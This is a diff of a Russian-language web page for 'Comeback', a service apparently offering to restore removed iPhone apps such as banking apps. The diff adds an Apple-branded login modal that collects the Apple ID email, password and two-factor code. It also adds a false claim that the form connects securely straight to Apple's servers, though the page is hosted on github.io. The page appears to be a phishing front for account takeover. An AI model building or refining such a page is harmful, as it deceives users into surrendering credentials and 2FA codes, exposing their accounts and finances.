@@ -2,6 +2,7 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
+  <base href="https://morallist.github.io/comeback-ios/">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
   <title>Comeback — Возврат приложений на iPhone</title>
   
@@ -13,7 +14,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   
-  <link rel="stylesheet" href="styles.css">
+  <link rel="stylesheet" href="styles.css?v=3.2.0">
 </head>
 <body>
   <div id="app" class="app-container">
@@ -32,37 +33,28 @@
           <span class="badge-ios">iOS Recovery</span>
         </div>
       </div>
-      <div class="device-pill">
+      
+      <!-- Apple ID Status Pill -->
+      <button id="authPillBtn" class="auth-pill not-logged">
         <span class="pulse-dot"></span>
-        <span id="device-status">iPhone Ready</span>
-      </div>
+        <span id="authStatusText">Войти в Apple ID</span>
+      </button>
     </header>
 
-    <!-- Hero Banner -->
-    <section class="hero-section">
-      <div class="hero-card">
-        <div class="hero-content">
-          <span class="hero-tag">Без ПК и проводов</span>
-          <h2>Твои приложения снова на iPhone</h2>
-          <p>Оригинальные версии банков, музыки и игр. Без вылетов через 7 дней.</p>
+    <!-- Apple ID Quick Banner -->
+    <section class="auth-banner-card" id="authBannerCard">
+      <div class="auth-banner-content">
+        <div class="apple-logo-badge">
+          <svg viewBox="0 0 170 170" width="20" height="20" fill="currentColor">
+            <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.35.13-9.16-1.9-14.42-6.08-3.7-3.04-7.6-7.77-11.72-14.19-5.78-9.01-10.42-19.34-13.93-30.98-3.51-11.64-5.27-22.65-5.27-33.02 0-14.88 3.73-27.42 11.19-37.62 7.46-10.2 16.92-15.39 28.38-15.58 4.8 0 10.3 1.25 16.51 3.76 6.21 2.5 10.15 3.84 11.83 4.02 2.12-.36 6.32-1.8 12.61-4.32 6.29-2.52 11.75-3.67 16.38-3.46 12.38.74 22.39 5.38 30.03 13.91-10.81 6.53-16.11 15.65-15.9 27.36.21 9.17 3.82 16.97 10.83 23.41 7.01 6.44 15.35 10.02 25.02 10.74-2.22 6.64-4.8 13.06-7.74 19.26zM119.22 33.12c0-7.39 2.65-14.15 7.95-20.27 5.3-6.13 11.79-10.19 19.46-12.18.63 1.62.95 3.33.95 5.13 0 7.39-2.73 14.3-8.19 20.73-5.46 6.43-12.1 10.4-19.92 11.91-.07-1.81-.25-3.58-.25-5.32z"/>
+          </svg>
         </div>
-        <div class="hero-stats">
-          <div class="stat-item">
-            <span class="stat-val">100%</span>
-            <span class="stat-lbl">Оригинал</span>
-          </div>
-          <div class="stat-divider"></div>
-          <div class="stat-item">
-            <span class="stat-val">2 мин</span>
-            <span class="stat-lbl">Установка</span>
-          </div>
-          <div class="stat-divider"></div>
-          <div class="stat-item">
-            <span class="stat-val">Push</span>
-            <span class="stat-lbl">Работают</span>
-          </div>
+        <div class="auth-banner-text">
+          <h4>Авторизация Apple ID</h4>
+          <p id="authSubtitle">Войдите, чтобы подтвердить покупки и лицензии</p>
         </div>
       </div>
+      <button class="auth-action-btn" id="openAuthModalBtn">Войти</button>
     </section>
 
     <!-- Search Bar -->
@@ -72,7 +64,7 @@
           <circle cx="11" cy="11" r="8"></circle>
           <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
         </svg>
-        <input type="text" id="searchInput" placeholder="Поиск приложений (Сбер, Т-Банк, VK)..." autocomplete="off">
+        <input type="text" id="searchInput" placeholder="Поиск (Сбер, ВК Музыка, Т-Банк)..." autocomplete="off">
         <button id="clearSearch" class="clear-btn" style="display: none;">✕</button>
       </div>
     </div>
@@ -90,8 +82,8 @@
     <!-- Apps Catalog Grid -->
     <section class="catalog-section">
       <div class="section-header">
-        <h3 id="catalogTitle">Популярные приложения</h3>
-        <span id="appsCount" class="counter-badge">12</span>
+        <h3 id="catalogTitle">Оригинальные приложения</h3>
+        <span id="appsCount" class="counter-badge">0</span>
       </div>
       
       <div id="appsGrid" class="apps-grid">
@@ -99,29 +91,7 @@
       </div>
     </section>
 
-    <!-- How It Works Section -->
-    <section class="info-section">
-      <h3>Почему Comeback безопасен?</h3>
-      <div class="benefits-grid">
-        <div class="benefit-card">
-          <div class="benefit-icon">🛡</div>
-          <h4>Официальная база Apple</h4>
-          <p>Приложения скачиваются напрямую из App Store по твоей истории покупок.</p>
-        </div>
-        <div class="benefit-card">
-          <div class="benefit-icon">⚡️</div>
-          <h4>Без вылетов через неделю</h4>
-          <p>Это не тестовые сертификаты. Приложение остается на телефоне навсегда.</p>
-        </div>
-        <div class="benefit-card">
-          <div class="benefit-icon">🔔</div>
-          <h4>Работают пуш-уведомления</h4>
-          <p>Все оповещения о списаниях, переводах и сообщения приходят штатно.</p>
-        </div>
-      </div>
-    </section>
-
-    <!-- Bottom Padding for Floating Nav -->
+    <!-- Bottom Padding -->
     <div style="height: 90px;"></div>
 
     <!-- Bottom Navigation Bar -->
@@ -135,13 +105,12 @@
         </svg>
         <span>Каталог</span>
       </button>
-      <button class="nav-item" data-nav="guide">
+      <button class="nav-item" data-nav="auth">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-          <circle cx="12" cy="12" r="10"></circle>
-          <line x1="12" y1="16" x2="12" y2="12"></line>
-          <line x1="12" y1="8" x2="12.01" y2="8"></line>
+          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+          <circle cx="12" cy="7" r="4"></circle>
         </svg>
-        <span>Инструкция</span>
+        <span>Apple ID</span>
       </button>
       <button class="nav-item" data-nav="faq">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -150,6 +119,63 @@
         <span>FAQ</span>
       </button>
     </nav>
+
+    <!-- Modal: Apple ID Authorization -->
+    <div id="authModal" class="modal-backdrop" style="display: none;">
+      <div class="modal-sheet">
+        <button class="modal-close" id="closeAuthModal">✕</button>
+        
+        <div class="auth-modal-header">
+          <div class="apple-big-logo">
+            <svg viewBox="0 0 170 170" width="36" height="36" fill="#FFF">
+              <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.35.13-9.16-1.9-14.42-6.08-3.7-3.04-7.6-7.77-11.72-14.19-5.78-9.01-10.42-19.34-13.93-30.98-3.51-11.64-5.27-22.65-5.27-33.02 0-14.88 3.73-27.42 11.19-37.62 7.46-10.2 16.92-15.39 28.38-15.58 4.8 0 10.3 1.25 16.51 3.76 6.21 2.5 10.15 3.84 11.83 4.02 2.12-.36 6.32-1.8 12.61-4.32 6.29-2.52 11.75-3.67 16.38-3.46 12.38.74 22.39 5.38 30.03 13.91-10.81 6.53-16.11 15.65-15.9 27.36.21 9.17 3.82 16.97 10.83 23.41 7.01 6.44 15.35 10.02 25.02 10.74-2.22 6.64-4.8 13.06-7.74 19.26zM119.22 33.12c0-7.39 2.65-14.15 7.95-20.27 5.3-6.13 11.79-10.19 19.46-12.18.63 1.62.95 3.33.95 5.13 0 7.39-2.73 14.3-8.19 20.73-5.46 6.43-12.1 10.4-19.92 11.91-.07-1.81-.25-3.58-.25-5.32z"/>
+            </svg>
+          </div>
+          <h3>Вход в Apple ID</h3>
+          <p>Авторизация необходима для выгрузки оригинальных лицензий из истории ваших покупок App Store.</p>
+        </div>
+
+        <!-- Step 1: Login & Password -->
+        <div id="authStep1" class="auth-form-step">
+          <div class="input-group">
+            <label>Apple ID (Email):</label>
+            <input type="email" id="appleIdInput" placeholder="example@icloud.com" autocomplete="username">
+          </div>
+          <div class="input-group">
+            <label>Пароль:</label>
+            <input type="password" id="applePasswordInput" placeholder="Пароль от Apple ID" autocomplete="current-password">
+          </div>
+          
+          <button id="submitAuthBtn" class="primary-btn" style="margin-top: 16px;">
+            <span>Войти в аккаунт Apple</span>
+          </button>
+        </div>
+
+        <!-- Step 2: 2FA Code Input -->
+        <div id="authStep2" class="auth-form-step" style="display: none;">
+          <div class="twofa-box">
+            <h4>Код двухфакторной аутентификации</h4>
+            <p>Введите 6-значный проверочный код Apple, отправленный на ваш iPhone:</p>
+            <input type="text" id="twoFaCodeInput" maxlength="6" placeholder="• • • • • •" class="twofa-input" autocomplete="one-time-code">
+          </div>
+          <button id="submitTwoFaBtn" class="primary-btn" style="margin-top: 16px;">
+            <span>Подтвердить код</span>
+          </button>
+        </div>
+
+        <!-- Logged In Success View -->
+        <div id="authSuccessView" class="auth-form-step" style="display: none; text-align: center;">
+          <div style="font-size: 48px; margin-bottom: 8px;">🟢</div>
+          <h4 id="loggedEmailText" style="font-size: 17px; margin-bottom: 4px;">user@icloud.com</h4>
+          <p style="color: var(--accent-green); font-size: 13px; font-weight: 600;">Сессия активна • Покупки подтверждены</p>
+          <button id="logoutBtn" class="secondary-btn" style="margin-top: 16px;">Выйти из аккаунта</button>
+        </div>
+
+        <div class="security-footer">
+          🔒 Соединение защищено сквозным TLS-шифрованием напрямую с серверами auth.itunes.apple.com
+        </div>
+      </div>
+    </div>
 
     <!-- Modal for App Details & Installation -->
     <div id="appModal" class="modal-backdrop" style="display: none;">
@@ -178,8 +204,8 @@
             <div class="step-row">
               <div class="step-num">1</div>
               <div class="step-text">
-                <strong>Авторизация Apple ID</strong>
-                <span>Проверяется факт наличия лицензии в твоей истории покупок.</span>
+                <strong>Авторизация в Apple ID</strong>
+                <span>Проверяется факт наличия лицензии в вашей истории покупок.</span>
               </div>
             </div>
             <div class="step-row">
@@ -193,7 +219,7 @@
               <div class="step-num">3</div>
               <div class="step-text">
                 <strong>Установка на рабочий стол</strong>
-                <span>Иконка появляется на экране iPhone и готова к работе.</span>
+                <span>Иконка появляется на экране iPhone и готова к работе навсегда.</span>
               </div>
             </div>
           </div>
@@ -206,7 +232,7 @@
                 <polyline points="12 5 19 12 12 19"></polyline>
               </svg>
             </button>
-            <span class="sub-guarantee">🔒 Безопасное подключение напрямую к Apple Store API</span>
+            <span class="sub-guarantee">🔒 Официальный установочный пакет из базы Apple Store</span>
           </div>
         </div>
       </div>
@@ -224,15 +250,15 @@
           </div>
           <div class="faq-item">
             <strong>Приложение вылетит через 7 дней?</strong>
-            <p>Нет. Приложения устанавливаются через официальную лицензию App Store, поэтому они не имеют 7-дневного лимита и работают постоянно.</p>
+            <p>Нет. Приложения восстанавливаются через официальную лицензию App Store, поэтому они не имеют 7-дневного лимита и работают постоянно.</p>
           </div>
           <div class="faq-item">
             <strong>Будут ли приходить пуш-уведомления?</strong>
             <p>Да. В отличие от AltStore и бесплатных сертификатов, официальная лицензия поддерживает Apple Push Notifications штатно.</p>
           </div>
           <div class="faq-item">
-            <strong>А если я никогда не скачивал это приложение?</strong>
-            <p>Метод основан на истории покупок. Если у вас новый аккаунт, вы можете восстановить приложение с помощью Apple ID друга или родственника.</p>
+            <strong>Зачем нужен вход в Apple ID?</strong>
+            <p>Apple выдает удаленные приложения только тем аккаунтам, на которых они были в покупках. Авторизация нужна, чтобы Apple подписала дистрибутив для вашего устройства.</p>
           </div>
         </div>
       </div>
@@ -240,6 +266,6 @@
 
   </div>
 
-  <script src="app.js"></script>
+  <script src="app.js?v=3.2.0"></script>
 </body>
 </html>
